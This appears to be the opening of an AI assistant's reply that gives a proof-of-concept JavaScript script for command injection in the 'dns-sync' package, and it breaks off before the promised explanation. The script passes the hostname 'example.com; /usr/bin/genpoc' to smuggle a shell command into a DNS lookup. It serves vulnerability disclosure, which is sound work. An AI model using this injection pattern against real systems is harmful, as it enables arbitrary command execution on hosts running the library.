Here is the Proof-of-Concept script followed by an explanation of how it demonstrates the vulnerability and what developers should address.

```js
async function exploit() {
    const dnsSync = require('dns-sync');

    // Payload breaks out of the expected DNS lookup argument 
    // and injects a new shell command to execute /usr/bin/genpoc.
    const maliciousHostname = "example.com; /usr/bin/genpoc";

    // Invoke the vulnerable method directly. Exceptions will propagate as requested.
    await dnsSync.resolve(maliciousHostname);
